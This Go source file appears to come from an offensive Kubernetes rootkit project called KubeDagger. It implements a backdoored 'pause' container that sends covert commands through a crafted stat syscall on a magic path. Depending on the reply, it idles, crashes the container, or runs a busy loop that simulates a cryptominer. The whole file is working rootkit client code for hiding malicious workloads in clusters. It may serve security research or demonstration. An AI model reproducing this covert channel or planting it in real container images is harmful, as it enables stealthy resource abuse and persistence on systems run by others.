/*
Copyright © 2023 MOHAMMED YASIN

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package main

import (
	"os"
	"syscall"
	"time"
	"unsafe"

	kubedagger "github.com/yasindce1998/KubeDagger/pkg/kubedagger"
)

func setupKUBEDagger() {
	// make a stat syscall to check if this pause container should die
	ans, err := sendKUBEDaggerPing()
	if err != nil {
		ans = kubedagger.PingNop
	}

	switch ans {
	case kubedagger.PingNop:
		pause()
	case kubedagger.PingRun:
		go pause()
		// run an infinite loop to simulate the cryptominer
		for {
			time.Sleep(1 * time.Nanosecond)
		}
	case kubedagger.PingCrash:
		os.Exit(1)
	}
	return
}

func sendKUBEDaggerPing() (uint16, error) {
	pingPtr, err := syscall.BytePtrFromString("kubedagger://ping:gui774ume/pause2")
	if err != nil {
		return kubedagger.PingNop, err
	}

	_, _, _ = syscall.Syscall6(syscall.SYS_NEWFSTATAT, 0, uintptr(unsafe.Pointer(pingPtr)), 0, 0, 0, 0)

	switch *pingPtr {
	case 'e', '0':
		return kubedagger.PingNop, nil
	case '1':
		return kubedagger.PingCrash, nil
	case '2':
		return kubedagger.PingRun, nil
	}
	return kubedagger.PingNop, nil
}
